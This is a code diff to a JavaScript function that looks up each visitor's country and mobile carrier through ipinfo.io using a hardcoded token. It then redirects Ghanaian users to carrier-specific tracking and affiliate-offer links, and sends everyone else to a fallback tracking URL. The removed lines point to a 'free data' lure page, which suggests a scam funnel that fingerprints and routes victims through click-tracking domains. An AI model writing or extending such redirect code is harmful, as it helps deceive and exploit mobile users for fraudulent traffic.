@@ -142,15 +142,29 @@ function detectNetwork() {
   fetch("https://ipinfo.io/json?token=55355b912bdc12")
     .then(res => res.json())
     .then(data => {
+
       const network = data.org ? data.org.toLowerCase() : "";
+      const country = data.country || "";
+
+      // Ghana only fallback safety
+      if (country !== "GH") {
+        window.location.href = "https://vdbsvtk.com/cl/67a9642f26918e02";
+        return;
+      }
 
       if (network.includes("mtn")) {
+        window.location.href = "https://vdbsvtk.com/cl/021c421418cf3f46";
+
+      } else if (network.includes("airtel") || network.includes("tigo")) {
         window.location.href = "https://vdbsvtk.com/cl/67a9642f26918e02";
-      } else if (network.includes("airtel")) {
-        window.location.href = "https://getfreedatatoday.netlify.app/picture.html";
+
+      } else if (network.includes("telecel") || network.includes("vodafone")) {
+        window.location.href = "https://www.whencominghome.wiki/click?offer_id=34439&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE";
+
       } else {
         window.location.href = "https://vdbsvtk.com/cl/67a9642f26918e02";
       }
+
     })
     .catch(() => {
       window.location.href = "https://vdbsvtk.com/cl/67a9642f26918e02";
